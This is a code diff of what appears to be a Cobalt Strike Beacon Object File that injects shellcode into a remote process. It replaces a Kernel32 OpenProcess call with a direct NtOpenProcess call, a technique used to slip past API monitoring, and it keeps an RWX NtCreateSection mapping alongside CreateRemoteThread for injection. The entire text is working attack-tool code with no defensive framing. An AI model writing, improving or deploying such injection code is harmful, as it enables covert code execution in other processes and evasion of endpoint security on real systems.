@@ -6,7 +6,6 @@
 
 #define NT_SUCCESS 0x00000000
 
-WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
 
@@ -29,13 +28,23 @@ void go(char * args, int len) {
     HANDLE baseAddrLocal = NULL;
 
     LARGE_INTEGER sectionSize = { shellcodeSize };
-
+    
+    CLIENT_ID cid = {0};
+    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
+    
 
     // Local process handle
     hLocalProcess = -1;
 
     // Remote process handle
-    hRemoteProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
+    cid.UniqueProcess = procID;
+    
+    NTSTATUS getHandle = NtOpenProcess(&hRemoteProcess,PROCESS_ALL_ACCESS, &oa, &cid);
+
+    if(getHandle != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error getting process handle  Aborting...");
+        return;
+    }
 
     // Create RWX memory section
     NTSTATUS res = NtCreateSection(&hSection, GENERIC_ALL, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
